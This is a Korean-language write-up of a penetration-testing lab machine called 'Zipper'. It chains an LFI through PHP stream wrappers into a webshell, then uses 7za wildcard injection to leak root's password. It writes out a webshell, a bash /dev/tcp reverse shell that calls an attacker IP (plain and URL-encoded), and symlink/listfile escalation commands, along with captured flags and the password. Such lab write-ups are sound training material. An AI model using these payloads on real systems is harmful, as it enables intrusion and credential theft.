---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/lin/wildcard
  - tech/lin/cron
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.164.229
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.164.229`(작업 도중 `192.168.103.229`로 재할당) · Ubuntu 20.04 (`zipper`) · Advanced · 플래그 2개
> 진입점: 업로드 폼 → `index.php?file=` LFI → `php://filter`로 `upload.php` 소스 유출 → 업로드 zip 내부의 웹셸을 `zip://`로 실행 → `www-data`
> 권한상승: root 크론(`* * * * *`, 매분)의 `7za a *.zip` 와일드카드 인젝션 — `@enox.zip` 리스트파일 + `enox.zip -> /root/secret` 심볼릭 링크(둘 다 박스 제작자가 사전 배치) → `backup.log`에 `/root/secret` 값 유출 → `su -` → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.164.229

### Initial Access – 업로드 zip 내부 웹셸을 LFI 스트림 래퍼로 실행해 RCE 로 전환

**Vulnerability Explanation:**
- `index.php?file=` 파라미터가 검증 없이 `include`에 들어가 LFI 성립. 확장자 append 형(`.php`가 자동으로 붙음)이라 `/etc/passwd`류는 못 읽고 `.php` 파일만 읽힘. `[가정]` — `index.php` 원문 소스는 확보하지 못했고, 성공한 두 페이로드(`resource=upload`→`upload.php`, `zip://...#shell`→`shell.php`)가 공통으로 확장자를 생략한다는 사실로 역산한 판단
- `php://filter/convert.base64-encode/resource=upload` — base64 인코딩으로 실행 트리거(`<?php`)를 파괴해 `upload.php` 소스를 그대로 유출
- 유출된 소스: 업로드 파일을 검증 없이 `ZipArchive::addFromString($_FILES['img']['name'][$i], ...)`로 zip에 넣음 — **디스크 사본은 `<날짜><난수>.tmp`로 개명되지만 zip 내부 엔트리 이름은 원본 그대로 보존**됨. `/uploads/`에 PHP 실행을 끄는 `.htaccess`(32B)가 있어 직접 업로드 실행은 막혀 있으나, `zip://<아카이브>#<엔트리>` 래퍼로 아카이브 내부 파일을 `include`하면 그 방어를 그대로 우회
- `allow_url_include=Off`는 `zip://`·`php://filter` 어느 쪽도 막지 못함(둘 다 로컬 스트림 래퍼라 이 설정의 영향 밖)

**Vulnerability Fix:**
- `include` 대상은 화이트리스트 매핑으로 제한하고 사용자 입력을 경로 문자열로 쓰지 않음
- zip 엔트리 이름도 서버 생성 난수로 통일 — 디스크 사본 개명만으로는 방어되지 않음
- 업로드 파일명 `time()` 대신 `random_bytes()` 사용, `open_basedir`로 접근 경로 제한

**Severity:** Critical — 무인증 RCE(업로드 기능만 있으면 인증 절차 없이 도달)

**Steps to reproduce the attack:**
1. `/index.php?file=` 파라미터로 LFI 확인
2. `php://filter/convert.base64-encode/resource=upload`로 `upload.php` 소스 유출
3. `shell.php`(`<?php system($_GET["c"]); ?>`)를 업로드 → 응답이 알려주는 아카이브 이름(`upload_<time>.zip`) 확보
4. `index.php?file=zip://uploads/upload_<time>.zip%23shell&c=id`로 웹셸 실행 확인
5. `curl -G --data-urlencode`로 리버스셸 페이로드 전달(`bash -c '...'`로 감싸 dash 문법 오류 회피)
6. 대화형 셸에서 `local.txt` 확인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.164.229 | TCP: 22, 80 |

```text
# Nmap 7.98 scan initiated Mon Jul 13 11:53:09 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.164.229
Nmap scan report for 192.168.164.229
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   86.53 ms 192.168.45.1
2   86.51 ms 192.168.45.254
3   86.67 ms 192.168.251.1
4   86.72 ms 192.168.164.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 13 11:53:35 2026 -- 1 IP address (1 host up) scanned in 26.67 seconds
```
— 출처: `~/PG/Zipper/nmap.log`

`OpenSSH 8.2p1 Ubuntu 4ubuntu0.3` + `Apache httpd 2.4.41` 두 패키지 버전이 모두 Ubuntu 20.04 focal 표준 — 버전 판정 독립 근거 2개. `Running: MikroTik RouterOS 7.X`는 nmap OS 지문의 오탐(커널 버전대만으로 후보를 나열) — 패키지 버전 쪽이 훨씬 강한 근거.

```text
http://192.168.164.229 [200 OK] Apache[2.4.41], Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.164.229], Script, Title[Zipper]
```
— 출처: `~/PG/Zipper/whatweb.txt`

알려진 CMS 지문(WordPress·Drupal·Joomla) 없음 — 손으로 짠 PHP. CVE 검색이 아니라 직접 열거로 진행.

```bash
feroxbuster -u http://192.168.164.229/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt
```

확장자를 `html,txt`만 줘서 `upload.php`처럼 직접 링크되지 않은 PHP 파일은 목록에 안 나옴(`index.php`는 `/`의 링크에서 추출된 것이지 사전 매칭이 아님). 사전 20만 7643단어 × 확장자 2종 × `/`·`/uploads/` 재귀 = **124만 5795 요청, 19분 소요**(원문 진행바 `[####] - 19m 1245795/1245795`). 결과는 `/uploads/`(301) + `/`의 업로드 폼 — 이 둘이 박스의 뼈대.

![[Pasted image 20260713154219.png]]
![[Pasted image 20260713154253.png]]

업로드 폼 확인 사항 셋 — ①저장 경로 노출 여부(노출) ②파일명 유지·변경 여부(변경, 시각 기반이라 예측 가능) ③업로드 디렉터리에서 PHP 실행 여부(차단 — `.htaccess`). ③ 때문에 직접 업로드 실행이 막혀 LFI가 실행 경로가 됨.

### Initial Access – LFI 스트림 래퍼 체인(`php://filter` → `zip://`)

```text
http://192.168.164.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```

![[Pasted image 20260713160249.png]]

응답을 `base64 -d`로 디코드해 `upload.php` 소스 확보. 결함 표:

| 코드 | 문제 |
|---|---|
| 검증 없음 | 확장자·MIME·매직바이트 미확인 |
| `$zip_name = getcwd() . "/uploads/upload_" . time() . ".zip"` | 파일명이 유닉스 초 — 완전 예측 가능. 응답이 이름을 알려줘 추측조차 불필요 |
| `$zip->addFromString($_FILES['img']['name'][$i], ...)` | zip 엔트리 이름 = 원본 파일명 그대로 → `shell.php` 이름이 아카이브 안에 생존 |
| `move_uploaded_file(..., './uploads/' . $newname)` | 디스크 사본만 `.tmp`로 개명(실행 방지), zip 내부는 방치 |

```php
$zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
```
— 출처: LFI 로 유출한 `upload.php` 응답 원문 인용(응답 자체는 파일로 미보존, 노트 원문 인용)

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```

`shell.php` 업로드 → 응답의 아카이브 이름 확보 → 웹셸 실행:

```text
http://192.168.164.229/index.php?file=zip://uploads/upload_1783926987.zip%23shell&c=id
```

![[Pasted image 20260713161854.png]]

`%23`(=`#`)를 인코딩하지 않으면 클라이언트가 프래그먼트로 잘라 서버에 안 보냄 — 가장 흔한 실패 원인.

리버스셸 단계에서 타겟 IP가 `192.168.164.229` → `192.168.103.229`, 아카이브도 `upload_1783926987.zip` → `upload_1783991346.zip`으로 바뀜. `[가정]` 랩 인스턴스 재시작으로 IP가 재할당되고 업로드가 소멸해 웹셸을 다시 올린 것으로 판단 — 원문 재시작 로그는 미보존.

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ curl -G "http://192.168.103.229/index.php" \
  --data-urlencode "file=zip://uploads/upload_1783991346.zip#shell" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.45.244/4444 0>&1'"
```
— 출처: `Pasted image 20260714103424.png`(대화형 Kali 터미널 캡처)

![[Pasted image 20260714103424.png]]

```text
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.229] 48642
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zipper:/var/www/html$ whoami
whoami
www-data
```
— 출처: `Pasted image 20260714103437.png`

![[Pasted image 20260714103437.png]]

`bash -c '...'`로 감싼 이유 — `>&`·`0>&1`는 bash 문법인데 `system()`은 `/bin/sh`(dash)로 실행되어 감싸지 않으면 문법 오류로 셸이 안 붙음. `curl -G --data-urlencode`는 GET 강제 + `#`·공백·`&` 자동 인코딩.

같은 요청을 브라우저/프록시로 보낸 판(포트 4443) — 손으로 인코딩할 때의 정답 형태.

```text
GET /index.php?file=zip://uploads/upload_1783991346.zip%23shell&c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.244%2F4443%200%3E%261%27 HTTP/1.1
Host: 192.168.103.229
```
— 출처: `Pasted image 20260714104154.png`(프록시 Request 뷰)

![[Pasted image 20260714104154.png]]

`#`→`%23` · 공백→`%20` · `'`→`%27` · `>`→`%3E` · `&`→`%26` · `/`→`%2F`. `&`를 인코딩하지 않으면 `c=` 파라미터가 거기서 끊김 — 리버스셸 문자열의 `>&`·`0>&1`가 정확히 이 함정에 걸림.

TTY 업그레이드 기록 없음. 이 박스는 nc 셸 그대로 `su -`가 통과함 — 근거는 권한상승 절 캡처에서 비밀번호가 화면에 그대로 에코된 것(pty 였으면 에코가 꺼짐).

```text
www-data@zipper:/var/www$ ls
ls
html
local.txt
www-data@zipper:/var/www$ cat local.txt
cat local.txt
fda17a6a06bc246bc1336e7ef6adf6e6
```
— 출처: `Pasted image 20260714111529.png`(로컬 플래그 확인 직후 화면 캡처)

![[Pasted image 20260714111529.png]]

**Local.txt value:**
`fda17a6a06bc246bc1336e7ef6adf6e6`

### Privilege Escalation – root 크론의 `7za` 와일드카드 인젝션

**Vulnerability Explanation:**
- root 크론(`* * * * *`, 매분)이 `www-data`가 쓰기 가능한 `/var/www/html/uploads`에서 `7za a ... *.zip`를 실행 — 글로브 확장 결과가 인용 없이 argv에 들어감
- `7z`는 `@파일명` 형태 인자를 리스트파일로 해석. `*.zip`에 매칭되는 이름의 파일(`@enox.zip`)을 만들면 `7za`가 그 내용을 파일 목록으로 읽으려 시도
- `enox.zip`을 `/root/secret`(root 전용 읽기)으로의 심볼릭 링크로 만들면, root 권한으로 도는 `7za`가 그 내용을 읽어 "없는 파일 이름"으로 착각해 에러 메시지에 그대로 출력 — `www-data`가 읽을 수 있는 `backup.log`로 그 값이 유출됨
- **이 박스는 `@enox.zip`(리스트파일)과 `enox.zip -> /root/secret`(심볼릭 링크) 둘 다 박스 제작자가 사전 배치한 것**임 — 근거는 아래 재현 절의 `ls -al`(두 파일 모두 `.htaccess`와 같은 `Aug 12 2021`). 실전 타겟에는 없으므로 직접 만들어야 함

**Vulnerability Fix:**
- 크론 스크립트의 글로브를 `--`·`./` 접두사로 옵션 해석 차단: `7za a out.zip -tzip -- ./*.zip`
- 비밀번호를 명령행 인자(`-p$password`)로 넘기지 말고 환경변수/stdin 사용 — `/proc/*/cmdline`으로 전 사용자에 노출됨
- root 크론 출력 로그를 `chmod 600`으로 제한, `/root/secret`은 파일 대신 키링/시크릿 관리자로 이전
- 업로드 경로에서 심볼릭 링크 금지 및 주기 점검(`find /var/www -type l`)

**Severity:** Critical — 저권한 계정에서 root 평문 비밀번호 획득 → 즉시 root

**Steps to reproduce the attack:**
1. 셸 획득 직후 `id`·`sudo -l`·SUID·`getcap`·크론 열거
2. `/opt/backup.sh` 확인 — root 크론이 `/var/www/html/uploads`에서 `7za a ... *.zip` 실행
3. `uploads/` 디렉터리에 이미 배치된 `@enox.zip`(리스트파일)·`enox.zip -> /root/secret`(심볼릭 링크) 확인
4. 크론 주기(1분) 대기 후 `/opt/backups/backup.log` 확인 — `/root/secret` 값이 에러 메시지로 노출
5. `su -`로 root 전환, `proof.txt` 확인

```text
www-data@zipper:/opt$ cat backup.sh
cat backup.sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.logwww-data@zipper:/opt$
```
— 출처: `Pasted image 20260714114834.png`

![[Pasted image 20260714114834.png]]

`password=`cat /root/secret`` — root 만 읽는 파일을 읽어 변수에 담음 → 이 스크립트가 root 로 실행된다는 증거. `cd /var/www/html/uploads` — www-data 가 쓰기 가능한 디렉터리로 이동. `*.zip` 글로브가 공격 지점. `-p$password` 는 비밀번호를 명령행 인자로 넘기므로 `/proc/*/cmdline`·`pspy` 로도 새는 별도 벡터(이 박스에서는 미시도 `[가정]`).

크론 확인(linpeas 출력):

```text
17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *    root    bash /opt/backup.sh
```
— 출처: `Pasted image 20260714114748.png`(linpeas 출력 중 크론 구획)

![[Pasted image 20260714114748.png]]

마지막 줄이 `* * * * *`(전 필드 와일드카드) — 매분 실행 확정.

디렉터리 상태 확인. 처음 본 시점(크론 발견 직후)에 이미 `@enox.zip`이 존재:

```text
www-data@zipper:/var/www/html/uploads$ ls -al
ls -al
total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 14 01:10 .
drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
-rw-r--r-- 1 www-data www-data    0 Aug 12  2021 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
-rw-r--r-- 1 www-data www-data  144 Jul 14 01:09 upload_1783991346.zip
```
— 출처: `Pasted image 20260714115639.png`

![[Pasted image 20260714115639.png]]

`@enox.zip`도 `enox.zip`(심볼릭 링크)도 날짜가 `Aug 12 2021` — `.htaccess`·`upload_1628773085.zip`과 같은 박스 제작 시점. **와일드카드 인젝션에 필요한 두 파일이 이미 다 배치돼 있었음.** 이후 실행한 `touch @enox.zip`은 이미 존재하는 파일의 mtime 만 갱신 — 아래 `ls -al`에서 `@enox.zip` 날짜가 `Jul 14 03:12`로 바뀐 것이 그 흔적임(타겟 시각은 UTC, 캡처 시각 12:15 KST 와 9시간 차):

```text
www-data@zipper:/var/www/html/uploads$ touch @enox.zip
touch @enox.zip
www-data@zipper:/var/www/html/uploads$ ls -al
ls -al
total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 14 03:11 .
drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
-rw-r--r-- 1 www-data www-data    0 Jul 14 03:12 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
-rw-r--r-- 1 www-data www-data  144 Jul 14 01:09 upload_1783991346.zip
```
— 출처: `Pasted image 20260714121500.png`

![[Pasted image 20260714121500.png]]

**실전(제작자 힌트가 없는 타겟)에서 필요한 두 줄:**
```bash
ln -s /root/secret enox.zip
touch @enox.zip
```
이름을 `enox.zip`으로 맞추는 이유는 글로브 `*.zip`에 매칭시키기 위함임. `@secret` 같은 이름은 `*.zip`에 안 걸려 아무 일도 안 일어남.

크론 대기(1분 확정) 후 로그 확인:

```text
www-data@zipper:/opt/backups$ cat backup.log
cat backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 892

Scanning the drive:
3 files, 319 bytes (1 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 3


Files read from disk: 3
Archive size: 892 bytes (1 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
```
— 출처: `Pasted image 20260714121543.png`(`Scan WARNINGS: 1` 종결 두 줄은 생략)

![[Pasted image 20260714121543.png]]

마지막 줄 `WildCardsGoingWild`가 `/root/secret`의 값. root 권한으로 도는 `7za`가 그 내용을 "파일명"으로 해석해 못 찾겠다는 에러에 그대로 실어준 것.

```text
www-data@zipper:/var/www/html/uploads$ su -
su -
Password: WildCardsGoingWild
whoami
root
cat /root/proof.txt
f759ae397349838d362d2fc874892c17
```
— 출처: `Pasted image 20260714121708.png`

![[Pasted image 20260714121708.png]]

### Post-Exploitation

**Proof.txt value:**
`f759ae397349838d362d2fc874892c17`

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| `/var/www/html/uploads/upload_1783926987.zip`(웹셸 포함) | 랩 리버트로 소멸 |
| `/var/www/html/uploads/upload_1783991346.zip`(웹셸 포함) | 남아 있음 |
| `/var/www/html/uploads/<날짜><난수>.tmp` 디스크 사본 | 크론의 `rm *.tmp`가 매 주기 삭제 |
| `/var/www/html/uploads/@enox.zip` | 남아 있음(제작자 사전 배치분, mtime 만 갱신) — 정리하려면 `rm -- '@enox.zip'` |
| `/opt/backups/backup.log` | 비밀번호 노출 상태로 남음(다음 크론 주기에 덮어써짐) |
| 계정 생성·SSH 키 삽입 | 없음 |
| Kali 리스너(`nc -lnvp 4444`·`4443`) | 정리 기록 **관측 없음** — 대화형 터미널에서 띄운 것이라 세션 종료로 사라졌을 것 `[가정]` |

획득 자격증명: **root / `WildCardsGoingWild`**(`/root/secret`).

## 관련

- PHP 스트림 래퍼 공식 문서: https://www.php.net/manual/en/wrappers.php
- `zip://` 래퍼: https://www.php.net/manual/en/wrappers.compression.php
- HackTricks — Wildcards Spare Tricks (7-Zip): https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za
- p7zip 리스트파일(`@`) 문법: `man 7z` *"Command Line Syntax"* — `@listfile`
- (시도했다가 접은 경로) CVE-2021-3560 polkit 로컬 권한상승: https://github.com/curtishoughton/CVE-2021-3560 — 클론만 하고 실행 로그 없음
- [[_PLAYBOOK#B-31. 크론 기반 권한상승]] — 크론 최소 1주기 대기 패턴
- [[_PLAYBOOK#B-1-30. PHP 스트림 래퍼로 LFI 를 RCE 로 확장]]
- [[_PLAYBOOK#B-1-31. 업로드 파일명이 `time()` 기반이면 브루트로 뚫린다]]
- [[_PLAYBOOK#B-39. 와일드카드 인젝션 — 도구별 벡터]]
- [[_PLAYBOOK#A-2-23. 해시 문자는 반드시 `%23` — URL 프래그먼트가 서버에 안 간다]]
- [[_PLAYBOOK#A-4-12. 범용 로컬 권한상승 CVE 는 «5개 반사 명령 뒤»에 던진다]] — polkit 선행 시도 서사
- [[_PLAYBOOK#A-1-20. PHP 사이트인데 브루트 확장자에 `php` 를 안 넣었다]]
- [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]]
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] — dash 문법으로 깨지는 페이로드
- [[_PLAYBOOK#A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다]] — 업로드 증발
- [[Cockpit]] — `sudo tar -czvf ... *` 와일드카드 인젝션(tar 판, 같은 계열)
- [[Muddy]] — `php://filter` 언급 + 크론 `PATH` 하이재킹
- [[Astronaut]] · [[Exfiltrated]] — 크론 기반 지연 실행(최소 1주기 대기) 패턴
- [[Slort]] · [[Clue]] · [[Twiggy]] — LFI 계열 박스
- [[Hawat]] — 소스를 확보해 취약점을 찾는 화이트박스 리뷰 흐름
